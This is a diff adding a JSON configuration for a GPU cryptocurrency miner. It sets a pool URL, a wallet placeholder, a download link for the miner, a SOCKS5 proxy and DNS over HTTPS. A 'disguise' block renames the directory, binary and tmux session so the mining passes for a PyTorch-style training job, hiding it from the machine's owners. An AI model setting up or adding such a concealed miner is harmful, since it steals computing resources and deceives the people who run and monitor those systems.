@@ -1,0 +1,27 @@
+{
+  "socks": "socks5://127.0.0.1:1080",
+  "pool": {
+    "url": "stratum+tcp://pool.pearlhash.xyz:9000",
+    "dns_over_https": "cloudflare"
+  },
+  "wallet": {
+    "address": "YOUR_PRL_ADDRESS",
+    "worker": "gpu01"
+  },
+  "miner": {
+    "release_url": "https://github.com/andru-kun/wildrig-multi/releases/download/{version}/wildrig-multi-linux-{version}.tar.gz",
+    "version": "0.51.4",
+    "algo": "pearlhash",
+    "pearlhash_kernel": 2,
+    "print_time": 120,
+    "temp_limit": 78
+  },
+  "disguise": {
+    "app_dir_name": "train",
+    "binary_name": "pt_main",
+    "tmux_session": "train"
+  },
+  "gpu": {
+    "power_limit": 0
+  }
+}
